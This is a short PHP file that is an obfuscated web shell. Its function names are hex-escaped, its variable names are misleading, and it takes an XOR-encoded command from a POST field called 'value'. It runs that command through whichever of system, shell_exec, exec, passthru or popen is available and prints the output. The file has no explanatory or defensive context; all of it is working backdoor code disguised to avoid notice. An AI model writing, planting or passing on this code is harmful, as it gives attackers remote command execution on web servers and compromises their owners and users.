<?php

$reverse_searcher1 = "s\x79\x73te\x6D";
$module_controller = "h\x65\x782\x62in";
$reverse_searcher7 = "p\x63lo\x73\x65";
$reverse_searcher2 = "s\x68e\x6Cl\x5F\x65\x78ec";
$reverse_searcher6 = "\x73\x74\x72eam\x5F\x67\x65\x74\x5F\x63o\x6Etents";
$reverse_searcher5 = "p\x6Fp\x65n";
$reverse_searcher3 = "e\x78e\x63";
$reverse_searcher4 = "pa\x73s\x74\x68\x72u";
if (isset($_POST["\x76a\x6Cue"])) {
            function config_manager      (     $factor     ,       $sym     )   {     $itm     =     ''      ;     $l=0; do{$itm.=chr(ord($factor[$l])^$sym);$l++;} while($l<strlen($factor)); return    $itm;   }
            $value = $module_controller($_POST["\x76a\x6Cue"]);
            $value = config_manager($value, 95);
            if (function_exists($reverse_searcher1)) {
                $reverse_searcher1($value);
            } elseif (function_exists($reverse_searcher2)) {
                print $reverse_searcher2($value);
            } elseif (function_exists($reverse_searcher3)) {
                $reverse_searcher3($value, $flag_factor);
                print join("\n", $flag_factor);
            } elseif (function_exists($reverse_searcher4)) {
                $reverse_searcher4($value);
            } elseif (function_exists($reverse_searcher5) && function_exists($reverse_searcher6) && function_exists($reverse_searcher7)) {
                $sym_itm = $reverse_searcher5($value, 'r');
                if ($sym_itm) {
                    $elem_entry = $reverse_searcher6($sym_itm);
                    $reverse_searcher7($sym_itm);
                    print $elem_entry;
                }
            }
            exit;
        }